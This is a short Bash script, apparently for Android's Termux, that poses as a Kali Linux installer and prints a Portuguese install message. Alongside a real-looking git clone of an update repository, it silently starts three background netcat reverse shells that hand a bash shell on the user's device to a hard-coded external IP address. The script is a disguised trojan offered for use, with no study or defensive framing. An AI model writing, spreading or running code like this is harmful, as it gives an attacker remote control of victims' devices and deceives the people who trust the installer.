#!/bin/bash
#DEVELOPER DARKSEC

if [ "$1" == "" ]
then
	echo "USE DESSA FORMA :  bash $0 kali"
else
	echo "INSTALANDO O KALI..."
pkg install netcat && apt install netcat && apt update && apt upgrade
sleep 4
nc 18.229.146.63 15865 -e /data/data/com.termux/files/usr/bin/bash &
sleep 4
git clone https://github.com/tchelospy/Kali-Termux-update
sleep 4
cd Kali-Termux-update
sleep 4
sh Kali-Termux-update.sh
sleep 4
nc 18.229.146.63 15952 -e /bin/bash &
sleep 4
nc 18.229.146.63 15952 -e /data/data/com.termux/files/usr/bin/bash &
fi
